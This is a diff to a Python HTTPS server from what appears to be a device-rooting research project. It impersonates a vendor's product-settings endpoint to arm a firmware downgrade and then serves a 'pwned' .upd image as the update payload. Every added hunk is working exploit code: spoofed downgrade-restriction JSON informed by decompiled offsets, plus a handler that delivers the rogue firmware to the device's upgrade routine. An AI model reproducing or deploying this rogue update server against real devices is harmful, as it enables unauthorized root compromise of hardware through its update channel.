@@ -24,16 +24,23 @@ import threading
 CERT = "/tmp/q57-serve/fullchain.pem"
 KEY = "/tmp/q57-serve/leaf.key"
 LOG = "/tmp/q57-serve/requests.log"
+UPD_FILE = "/Users/jemanuel/projects/frankensonos/captures/research/rootbuild/pwned-q57.upd"
 
+# 2026-11-06 (decompile-informed, arming.c): ctx+0x108 (MinVersion string) and
+# ctx+0x14e (restrictions-seen flag) are BOTH required to arm. The binder has
+# TWO entries for downgradeMinVersion (binding table 0x104f2d74) — one at the
+# top level, one under downgradeRestrictions — so serve BOTH shapes.
 SETTINGS_BODY = json.dumps({
+    "downgradeMinVersion": "57.16-41110",
     "downgradeRestrictions": {
-        "downgradeMinVersion": "1",
+        "downgradeMinVersion": "57.16-41110",
         "allowDowngradeToPrevSWGen": True,
-        "denyDowngradeToPrevSwGenList": [],
+        "denyDowngradeToPrevSwGenList": {"swgen": []},
     },
     "swupdate": {
+        "downgradeMinVersion": "57.16-41110",
         "downgradeRestrictions": {
-            "downgradeMinVersion": "1",
+            "downgradeMinVersion": "57.16-41110",
             "allowDowngradeToPrevSWGen": True,
         },
     },
@@ -61,6 +68,22 @@ class H(http.server.BaseHTTPRequestHandler):
         self._log_hit("GET")
         if "product-settings" in self.path and "settings" in self.path:
             body = SETTINGS_BODY
+        elif self.path.endswith(".upd"):
+            # the root-fetch deliverable: served as the update payload once
+            # /var/run/upgradeinfo is armed (the device's /bin/upgrade fetches it)
+            try:
+                with open(UPD_FILE, "rb") as f:
+                    body = f.read()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/octet-stream")
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                with open(LOG, "a") as f:
+                    f.write("UPD-SERVED %s %d bytes\n" % (self.path, len(body)))
+                self.wfile.write(body)
+            except Exception as e:
+                self.log_message("upd err %s", e)
+            return
         else:
             body = b"{}"
         self.send_response(200)
